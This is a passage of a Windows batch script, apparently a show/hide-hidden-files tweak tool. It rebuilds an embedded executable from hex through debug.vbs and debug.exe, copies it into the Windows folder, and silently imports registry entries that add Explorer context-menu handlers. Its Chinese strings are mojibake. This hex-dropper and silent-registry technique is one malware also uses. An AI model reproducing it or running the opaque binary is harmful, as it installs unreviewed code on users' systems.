@echo +"650078006500000000000100030020200200010001003001000031752020100001000400E8020000327510101000010004002801000033752800000010000000200000000100040000000000C0000000000000000000000000000000000000000000000000008000008000000080800080000000800080008080000080808000"_>>debug.vbs
@echo +"C0C0C0000000FF0000FF000000FFFF00FF000000FF00FF00FFFF0000FFFFFF000000000000000000000000000000000000000000000000000000000008F07700000008FFFFF07770000FFFFFFFF07000000FFFFFFFF00000000FFFFFFFF00000000FFFFF80000000000F80000EE0000000000EEEE0000000000EE00000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000FFFF0000FFFF0000FF8F0000F8030000C0010000C0070000C00F0000C00F0000C00F0000C00F0000C00F0000C07F0000C7FF0000FFFF0000FFFF0000FFFF00002800000020000000400000000100040000000000800200000000000000000000"_>>debug.vbs
@echo +"00000000000000000000000000008000008000000080800080000000800080008080000080808000C0C0C0000000FF0000FF000000FFFF00FF000000FF00FF00FFFF0000FFFFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008FFF0770000000000000000000008FFFFFFF07777000000000000008FFFFFFFFFFFF0777777000000000FFFFFFFFFFFFFFFF0777700000000000FFFFFFFFFFFFFFFF0770000000000000FFFFFFFFFF"_>>debug.vbs
@echo +"FFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFF88880000000000000000FFFFFFFF88"_>>debug.vbs
@echo +"8800000000000000000000FFFF88880000EEEE000000000000000088880000EEEE000000000000000000000000EEEE000000000000000000000000EEEE00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC1FFFFFC007FFF80001FF8000007F800001FF800007FF80001FFF80001FFF80001FF"_>>debug.vbs
@echo +"F80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF8003FFFF803FFFFF83FFFFFFBFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF2800000020000000400000000100010000000000000100000000000000000000000000000000000000000000FFFFFF00FFFFFFFFFFFFFFFF"_>>debug.vbs
@echo +"FFFFFFFFFFFFFFFFFFFFFFFFFFFFC1FFFFFC3C7FFFC3FC1FF83FFC07FBFFFC1FFBFFFC7FFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFC1FFFBFC3DFFFBC3C1FFF83C3FFFFBC3FFFFF83FFFFFFBFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"_>>debug.vbs
@echo +"FFFFFFFFFFFFFFFFFFFFFFFFFFFFC1FFFFFC007FFFC0001FF8000007F800001FF800007FF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF8003FFFF803FFFFF83FFFFFFBFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"">>debug.vbs
@echo with wscript.stdout:r=vbcrlf:for i=1 to len(str) step 48:.write "e"+hex(256+(i-1)/2):for j=i to i+46 step 2:.write " "+mid(str,j,2):next:.write r:next>>debug.vbs
@echo .write "rbx"+r+"0"+r+"rcx"+r+"5000"+r+"n debug.tmp"+r+"w"+r+"q"+r:end with>>debug.vbs&&cscript //nologo debug.vbs|debug.exe>nul&&ren debug.tmp "yincang.exe"&del debug.vbs
md %windir%\winzheng\
copy yincang.exe %windir%\winzheng\
del yincang.exe
cls
ECHO Windows Registry Editor Version 5.00>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\AllFilesystemObjects\shell\SuperHidden]>>SHOWALL.reg
ECHO @="��ʾϵͳ�����ļ�">>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\AllFilesystemObjects\shell\SuperHidden\Command]>>SHOWALL.reg
ECHO @="C:\\WINDOWS\\winzheng\\yincang.exe">>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\Folder\shell\SuperHidden]>>SHOWALL.reg
ECHO @="����ϵͳ�����ļ�">>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\Folder\shell\SuperHidden\Command]>>SHOWALL.reg
ECHO @="C:\\WINDOWS\\winzheng\\yincang.exe">>SHOWALL.reg

REGEDIT /S SHOWALL.reg
DEL /F /Q SHOWALL.reg

exit
rem �������������������������������
goto 7
:list1_2a
MODE con: COLS=50 LINES=15
color 1f
cls
del /s /q %windir%\SuperHidden.vbs
del /s /q %windir%\winzheng\yincang.exe
cls
reg delete "HKCR\Directory\Background\shellex\ContextMenuHandlers\SuperHidden" /f
reg delete "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\InProcServer32" /f
reg delete "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance" /f
reg delete "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag" /f
reg delete "HKCR\AllFilesystemObjects\shell\SuperHidden"  /f
reg delete "HKCR\Folder\shell\SuperHidden" /f

ECHO Windows Registry Editor Version 5.00>SHOWALL.reg
ECHO [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]>>SHOWALL.reg
ECHO "ShowSuperHidden"=dword:00000001>>SHOWALL.reg
ECHO "Hidden"=dword:00000001>>SHOWALL.reg

REGEDIT /S SHOWALL.reg

DEL /F /Q SHOWALL.reg
cls
echo.
echo.
echo.
echo.
echo.
echo               ��ʾ/�����ļ�ɾ���ɹ�!
echo.
echo.
echo                   �����������!
pause>nul
goto list7_7
rem �������������������������������
goto 7
:list1_3
MODE con: COLS=50 LINES=15
color 4f
cls
del /s /q %windir%\SuperHidden.vbs
cls
ECHO REGEDIT4>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\Directory\Background\shellex\ContextMenuHandlers\SuperHidden]>>SHOWALL.reg
ECHO @="{00000000-0000-0000-0000-000000000012}">>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\CLSID\{00000000-0000-0000-0000-000000000012}\InProcServer32]>>SHOWALL.reg
ECHO @=hex(2):25,53,79,73,74,65,6d,52,6f,6f,74,25,5c,73,79,73,74,65,6d,33,32,5c,73,\>>SHOWALL.reg
ECHO   68,64,6f,63,76,77,2e,64,6c,6c,00>>SHOWALL.reg
ECHO "ThreadingModel"="Apartment">>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\CLSID\{00000000-0000-0000-0000-000000000012}\Instance]>>SHOWALL.reg
ECHO "CLSID"="{3f454f0e-42ae-4d7c-8ea3-328250d6e272}">>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag]>>SHOWALL.reg
ECHO "method"="ShellExecute">>SHOWALL.reg
ECHO "Param1"="SuperHidden.vbs">>SHOWALL.reg
ECHO "command"="��ʾ/������չ��">>SHOWALL.reg
ECHO "CLSID"="{13709620-C279-11CE-A49E-444553540000}">>SHOWALL.reg

ECHO [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]>>SHOWALL.reg
ECHO "ShowSuperHidden"=dword:00000000>>SHOWALL.reg
ECHO "Hidden"=dword:00000002>>SHOWALL.reg

REGEDIT /S SHOWALL.reg

DEL /F /Q SHOWALL.reg

cls
ECHO 'Show/Hide System Files>>C:\WINDOWS\SuperHidden.vbs 
echo.>>C:\WINDOWS\SuperHidden.vbs 
ECHO Dim WSHShell>>C:\WINDOWS\SuperHidden.vbs 
ECHO Set WSHShell = WScript.CreateObject("WScript.Shell")>>C:\WINDOWS\SuperHidden.vbs 
ECHO sTitle1 = "SSH=0">>C:\WINDOWS\SuperHidden.vbs 
ECHO sTitle2 = "SSH=1">>C:\WINDOWS\SuperHidden.vbs 
echo.>>C:\WINDOWS\SuperHidden.vbs 
ECHO if WSHShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden") = 1 then>>C:\WINDOWS\SuperHidden.vbs 
echo.>>C:\WINDOWS\SuperHidden.vbs 
ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", "0", "REG_DWORD">>C:\WINDOWS\SuperHidden.vbs 
ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", "1", "REG_DWORD">>C:\WINDOWS\SuperHidden.vbs 
ECHO WSHShell.RegWrite "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag\command", "��ʾ�ļ���չ��", "REG_SZ">>C:\WINDOWS\SuperHidden.vbs 
ECHO WSHShell.SendKeys "{F5}+{F10}e">>C:\WINDOWS\SuperHidden.vbs 
ECHO 'WSHShell.Popup "Poof, they're gone!", 1, sTitle1, vbInformation>>C:\WINDOWS\SuperHidden.vbs 
echo.>>C:\WINDOWS\SuperHidden.vbs 
ECHO else>>C:\WINDOWS\SuperHidden.vbs 
echo.>>C:\WINDOWS\SuperHidden.vbs 
ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", "1", "REG_DWORD">>C:\WINDOWS\SuperHidden.vbs 
ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", "0", "REG_DWORD">>C:\WINDOWS\SuperHidden.vbs 
ECHO WSHShell.RegWrite "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag\command", "�����ļ���չ��", "REG_SZ">>C:\WINDOWS\SuperHidden.vbs 
ECHO WSHShell.SendKeys "{F5}+{F10}e">>C:\WINDOWS\SuperHidden.vbs 
ECHO 'WSHShell.Popup "Here they are!", 1, sTitle2, vbInformation>>C:\WINDOWS\SuperHidden.vbs 
echo.>>C:\WINDOWS\SuperHidden.vbs 
ECHO end if>>C:\WINDOWS\SuperHidden.vbs 
echo.>>C:\WINDOWS\SuperHidden.vbs 
ECHO Set WSHShell = Nothing>>C:\WINDOWS\SuperHidden.vbs 
ECHO WScript.Quit(0)>>C:\WINDOWS\SuperHidden.vbs 
cls
echo.���������У����Ժ�...
@echo str="4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000B80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000"_>>debug.vbs
@echo +"8F8AF9DBCBEB9788CBEB9788CBEB978848F79988CAEB9788A2F49E88CAEB978822F49A88CAEB978852696368CBEB97880000000000000000504500004C010300B957B4450000000000000000E0000F010B010600002000000020000000000000D811000000100000003000000000400000100000001000000400000001000000"_>>debug.vbs
@echo +"04000000000000000050000000100000F1F80000020000000000100000100000000010000010000000000000100000000000000000000000042400002800000000400000100900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000280200002000000000100000B40000000000000000000000000000000000000000000000000000002E7465787400000098170000001000000020000000100000000000000000000000000000200000602E64617461000000EC090000003000000010000000300000000000000000000000000000400000C0"_>>debug.vbs
@echo +"2E727372630000001009000000400000001000000040000000000000000000000000000040000040FC4521411000000000000000000000004D535642564D36302E444C4C000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"FCB148738D6948736E9849739E10497373104973B0DB3B734E624873D568487324734673026248739A6248739A63487364B34873AF443B736FD83A73E6BB4973B89D3B7378B73A738A69487385E33B7309B448737C6746735B4E3B731D6648734E634873DC8E3B737F9D4973A1B24873CE624873CE634873026348733D5D4873"_>>debug.vbs
@echo +"3EDE397377954773A213497336B83A733C14497345B349734605477336B14873EA204873BAB44873350F4873FE473B7300000000000000000700080099234000C1234000A02340000000000000000000FF2534104000FF2558104000FF2568104000FF2528104000FF2524104000FF2570104000FF2518104000FF257C104000"_>>debug.vbs
@echo +"FF252C104000FF2578104000FF2574104000FF2560104000FF2548104000FF255C104000FF251C104000FF2504104000FF259C104000FF2500104000FF25A8104000FF256C104000FF2530104000FF2550104000FF25A4104000FF25A0104000FF2544104000FF250C104000FF2514104000FF2598104000FF2540104000FF25"_>>debug.vbs
@echo +"88104000FF2510104000FF2564104000FF2594104000FF253C104000FF25AC104000FF2590104000FF2520104000FF258C104000FF2584104000FF2508104000FF2554104000FF2538104000FF254C104000FF25801040006828134000E8F0FFFFFF0000000000003000000038000000000000005F0D7F7C8B9A7A4E8D1D3D05"_>>debug.vbs
@echo +"24A84C5800000000000001000000226164766170D7D3B3CCD0F2002200000000FFCC310000BC450CFB87DA604CAFE55E86E77A88C4F0E992301B50854AA53999CE40E29D5A3A4FAD339966CF11B70C00AA0060D393000000000000000000000000000000000000000000000000000000000000000000000000540000004F0000"_>>debug.vbs
@echo +"00000500466F726D31000D010500466F726D310003050000800A011901004200220123FFFFFFFF240500466F726D31002600270028002E003580340000092400003A0200001E0000004100FF0400000007000000DC18400050000000BC450CFB87DA604CAFE55E86E77A88C40000000000000000000000000000000000000000"_>>debug.vbs
@echo +"100000000000000000000000000000000000000000000000AD00000000000000201240004C00000056423521F01F7662366368732E646C6C000000002A000000000000000000000000000A000408000000000000000000001015400000F0300000FFFFFF080000000100000001000000E9000000D8124000D0124000E4114000"_>>debug.vbs
@echo +"78000000850000008B0000008C000000000000000000000000000000000000006B756F7A68616E676D696E6700B9A4B3CC310000D7D3B3CCD0F20000010000004C174000000000004C1D4000FFFFFFFF00000000A01740000830400001000000341440000000000000000000000000003414400001000000FC17400000000000"_>>debug.vbs
@echo +"381440000100000040144000000000003C14400001000000401440000100B70168006C0068144000E4324000000000003C6E1800FFFF00000C1840001C18400040001F00340000002C184000FFFFFFFF00000000000000006C14400008B01A003C184000FFFFFFFF081540000000000040144000BC134000C0114000C6114000"_>>debug.vbs
@echo +"CC11400000000000000000000000000000000000000000000000000000154000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"816C240433000000E993080000000000F40100004C17400000000000901D400000244000E409000008304000D6104000003040002A005C0041004B003A005C0058005000F3532E956962555CBE8B6E7F0759FD4E5C00505B0B7A8F5E5C00505B0B7A8F5E2E007600620070000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000D012400001000000000000002C304000181D4000FFFFFFFF000000001C304000B3D577B549017645864E49698081B6B90A00010004000100A0174000"_>>debug.vbs
@echo +"000000000000000000000000DC17400009040000040800000000000002000000BC134000FFFFFFFF10194000000000000000000000000000E417400002000000D0174000FFFF00008380010000000000B7664FC1B7664FC100000000D7D3B3CCD0F20000466F726D31000000F0E992301B50854AA53999CE40E29D5AE336C174"_>>debug.vbs
@echo +"D6061045BE39D461D836E219BC450CFB87DA604CAFE55E86E77A88C4B6ED832C637C644BAF51E92D778F259F3A4FAD339966CF11B70C00AA0060D393466F726D000000002E3DFBFCFAA06810A73808002B3371B5433A5C50726F6772616D2046696C65735C4D6963726F736F66742056697375616C2053747564696F5C564239"_>>debug.vbs
@echo +"385C5642362E4F4C420000005642000044184000000000000600000009000000541840008C184000D03240000000000000000000C0971A000D00000061647661706933322E646C6C000000000C0000005265674F70656E4B65794100BC184000D018400000000400D43240000000000000000000A1DC3240000BC07402FFE068"_>>debug.vbs
@echo +"DC184000B860114000FFD0FFE00000000C00400000000000000000005F5F7662614F626A56617200980000002A005C007300680065006C006C00650078005C0043006F006E0074006500780074004D0065006E007500480061006E0064006C006500720073005C007B00300030003000300030003000300030002D006B006900"_>>debug.vbs
@echo +"6E0067002D006B0069006E0067002D0032003200300030002D003000300030003000300030003000300030003000300030007D005C0046006F006C006400650072005C00000000009800000048004B00430055005C0053006F006600740077006100720065005C004D006900630072006F0073006F00660074005C0057006900"_>>debug.vbs
@echo +"6E0064006F00770073005C00430075007200720065006E007400560065007200730069006F006E005C004500780070006C006F007200650072005C0041006400760061006E006300650064005C004800690064006500460069006C006500450078007400000000001A00000057007300630072006900700074002E0053006800"_>>debug.vbs
@echo +"65006C006C000000520065006700520065006100640000000200000030000000120000005200450047005F00440057004F0052004400000052006500670057007200690074006500000000005800000048004B00430052005C0041006C006C00460069006C006500730079007300740065006D004F0062006A00650063007400"_>>debug.vbs
@echo +"73005C007300680065006C006C005C004800690064006500460069006C0065004500780074005C0000000000120000009096CF85F25DE5778765F64E6962555C0D5400000C0000005200450047005F0053005A00000000003C00000048004B00430052005C0046006F006C006400650072005C007300680065006C006C005C00"_>>debug.vbs
@echo +"4800690064006500460069006C0065004500780074005C0000000000160000007B00460035007D002B007B004600310030007D0065000000530065006E0064004B00650079007300000000000200000031000000120000003E663A79F25DE5778765F64E6962555C0D540000564241362E444C4C000000005F5F766261456E64"_>>debug.vbs
@echo +"000000005F5F7662615661725365744F626A416464726566000000005F5F76626146726565566172000000005F5F7662614C6174654D656D43616C6C000000005F5F766261467265655661724C697374000000005F5F7662615661724C6174654D656D43616C6C4C640000005F5F76626156617254737445710000005F5F7662"_>>debug.vbs
@echo +"6146726565537472000000005F5F766261566172436F7079000000005F5F76626153657453797374656D4572726F72005F5F766261537472546F416E736900005F5F766261493456617200005F5F7662615661724D6F7665000000004C1D40000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"000000000000000000000000000000000000000000000000000000004C174000FFFFFFFF00000000DC1C4000000000000000000000000000FFFFFFFF00000000901840002C184000E032400000000000BC134000FFFFFFFF000000000C00000000000000E01C400000000000E81C4000DC1C4000DC1C40000000000000000000"_>>debug.vbs
@echo +"000000004000000004000000CCCCCCCCE9E9E9E9CCCCCCCCCCCCCCCCCCCCCCCC558BEC83EC0C68D610400064A100000000506489250000000081ECD80000005356578965F4C745F8B81040008B45088BC883E101894DFC24FE508945088B10FF52048D45BC33DB50895DDC895DCC895DBC895DB8895DA8895D98895D88899D78"_>>debug.vbs
@echo +"FFFFFF899D68FFFFFF899D58FFFFFF899D38FFFFFF899D24FFFFFFFF15841040008D8D24FFFFFF8D55B851682C19400052898524FFFFFFFF158C104000506800000080E8ACFAFFFF8BF0FF15201040008B8524FFFFFFBF030000008D9578FFFFFF8D4DBC89458089BD78FFFFFFFF15901040008D9568FFFFFF8D4DDC89B570FF"_>>debug.vbs
@echo +"FFFF89BD68FFFFFFFF15081040008D4DB8FF15AC1040008D4DDC8D9578FFFFFF5152895D80C78578FFFFFF02800000FF153C1040006685C00F84D20400008B3564104000538D45A8BF08000000686C1A400050C74580CC19400089BD78FFFFFFFFD68B9578FFFFFF8B857CFFFFFF83EC10C78560FFFFFF010000008BCCC78558"_>>debug.vbs
@echo +"FFFFFF028000006A0168881A400089118B55808941048B45848951088D559889410C8D4DA85152FF159410400083C420508D8558FFFFFF50FF153C1040008D4D988D55A851526A0289851CFFFFFFFF151010400083C40C66399D1CFFFFFFC74580CC19400089BD78FFFFFF0F84830100006A008D45A8686C1A400050C78560FF"_>>debug.vbs
@echo +"FFFF9C1A400089BD58FFFFFFBBA41A4000FFD68B9578FFFFFF8B857CFFFFFF83EC108BCC83EC1089118B55808941048B45848951088B9558FFFFFF89410C8B855CFFFFFF8BCC83EC1089118B9560FFFFFF8941048B8564FFFFFF8951088B953CFFFFFF89410C8BCC8BC76A0389018B8544FFFFFF68B81A40008951048959088B"_>>debug.vbs
@echo +"1D4010400089410C8D4DA851FFD350FF158810400083C43C8D4DA8FF150C1040006A008D55A8686C1A400052C74580D01A400089BD78FFFFFFC78560FFFFFF301B400089BD58FFFFFFFFD68B8D78FFFFFF8B957CFFFFFF83EC108BC483EC1089088B4D808950048B55848948088B8D58FFFFFF89500C8B955CFFFFFF8BC483EC"_>>debug.vbs
@echo +"1089088B8D60FFFFFF8950048B9564FFFFFF8948088BCC89500C8BC789018B953CFFFFFFB8481B40008951046A0368B81A40008941088B8544FFFFFF89410C8D4DA851FFD350FF158810400083C43C8D4DA8FF150C104000C745805C1B400089BD78FFFFFFC78560FFFFFF301B4000E9840100006A008D45A8686C1A400050C7"_>>debug.vbs
